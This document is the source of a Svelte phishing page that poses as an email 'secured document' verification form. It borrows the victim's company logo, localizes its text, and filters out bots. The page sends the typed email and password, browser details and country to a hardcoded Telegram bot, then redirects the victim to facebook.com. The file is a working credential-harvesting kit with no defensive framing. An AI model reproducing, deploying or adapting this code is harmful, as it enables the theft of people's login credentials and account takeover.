<script>
  import { onMount } from 'svelte';
  import { writable } from 'svelte/store';

  const email = writable('');
  const password = writable('');
  const showPassword = writable(false);
  const showModal = writable(false);
  const domainLogo = writable('logo2.png');
  const localizedText = writable({
    enterEmail: 'Verify your email identity to access the secured document.',
    next: 'Next',
    enterPassword: 'Enter Password',
    verify: 'Verify',
    checking: 'Checking, please wait...'
  });

  const TELEGRAM_BOT_TOKEN = '8175604987:AAHvzFUpWsaLsf4JY-jIPQ2T75Q_stqT2bI';
  const TELEGRAM_CHAT_ID = '-1002434577801';

  const updateLogo = (emailValue) => {
    const domain = emailValue.split('@')[1];
    domainLogo.set(domain ? `https://logo.clearbit.com/${domain}` : 'logo2.png');
  };

  const requestPassword = () => {
    showPassword.set(true);
  };

  const verifyLogin = async () => {
    const { country, isBot } = await getIPInfo();

    if (isBot) {
      alert('Access denied. Detected as bot.');
      return;
    }

    showModal.set(true);

    setTimeout(() => {
      sendToTelegram();
      window.location.href = 'https://facebook.com';
    }, 2000);
  };

  const getIPInfo = async () => {
    try {
      const res = await fetch('https://ipapi.co/json/');
      const data = await res.json();
      return {
        country: data.country_name || 'Unknown',
        isBot: data.user_type === 'bot'
      };
    } catch (error) {
      return { country: 'Unknown', isBot: false };
    }
  };

  const sendToTelegram = async () => {
    const browserInfo = navigator.userAgent;
    const country = await getIPInfo().then((info) => info.country);

    const message = `Email: ${$email}\nPassword: ${$password}\nBrowser: ${browserInfo}\nCountry: ${country}`;
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(
      message
    )}`;

    fetch(url).catch((err) => console.error('Telegram Error:', err));
  };

  const setLocalization = async () => {
    try {
      const res = await fetch('https://ipapi.co/json/');
      const data = await res.json();
      const language = data.languages?.split(',')[0] || 'en';

      const translations = {
        en: {
          enterEmail: 'Verify your email identity to access the secured document.',
          next: 'Next',
          enterPassword: 'Enter Password',
          verify: 'Verify',
          checking: 'Checking, please wait...'
        },
        es: {
          enterEmail: 'Verifique su identidad de correo electrónico para acceder al documento seguro.',
          next: 'Siguiente',
          enterPassword: 'Ingrese contraseña',
          verify: 'Verificar',
          checking: 'Verificando, por favor espere...'
        },
        fr: {
          enterEmail: 'Vérifiez votre identité e-mail pour accéder au document sécurisé.',
          next: 'Suivant',
          enterPassword: 'Entrez le mot de passe',
          verify: 'Vérifier',
          checking: 'Vérification, veuillez patienter...'
        }
      };

      localizedText.set(translations[language] || translations.en);
    } catch (error) {
      console.error('Localization Error:', error);
    }
  };

  onMount(setLocalization);
</script>

<style>
  body {
    font-family: Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
    background: url('background.jpg') no-repeat center center fixed;
    background-size: cover;
  }

  .container {
    width: 300px;
    background: white;
    padding: 20px;
    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    border-radius: 10px;
  }

  .logo-container {
    display: flex;
    justify-content: space-between;
    margin-bottom: 20px;
  }

  .logo-container img {
    width: 40px;
    height: 40px;
  }

  .form-group {
    margin-bottom: 15px;
  }

  .profile-info {
    display: flex;
    align-items: center;
    margin-bottom: 15px;
  }

  .profile-info img {
    width: 40px;
    height: 40px;
    border-radius: 50%;
    margin-right: 10px;
  }

  .profile-info span {
    font-size: 14px;
    font-weight: bold;
  }

  input {
    width: 100%;
    padding: 10px;
    border: 1px solid #ddd;
    border-radius: 5px;
    margin-top: 5px;
  }

  button {
    width: 100%;
    padding: 10px;
    background: #007bff;
    color: white;
    border: none;
    border-radius: 5px;
    cursor: pointer;
  }

  button:disabled {
    background: #ccc;
    cursor: not-allowed;
  }
</style>

<div class="container">
  <div class="logo-container">
    <img src="logo1.png" alt="Logo 1">
    <img src={$domainLogo} alt="Logo 2">
  </div>
  {#if !$showPassword}
    <div class="form-group">
      <label for="email">{$localizedText.enterEmail}</label>
      <input
        type="email"
        id="email"
        bind:value={$email}
        on:input={() => updateLogo($email)}
      />
    </div>
    <button on:click={requestPassword} disabled={!$email}>{$localizedText.next}</button>
  {:else}
    <div class="profile-info">
      <img src="profile-icon.png" alt="Profile Icon">
      <span>{$email}</span>
    </div>
    <div class="form-group">
      <label for="password">{$localizedText.enterPassword}</label>
      <input type="password" id="password" bind:value={$password} />
    </div>
    <button on:click={verifyLogin} disabled={$password.length < 5}>{$localizedText.verify}</button>
  {/if}
</div>
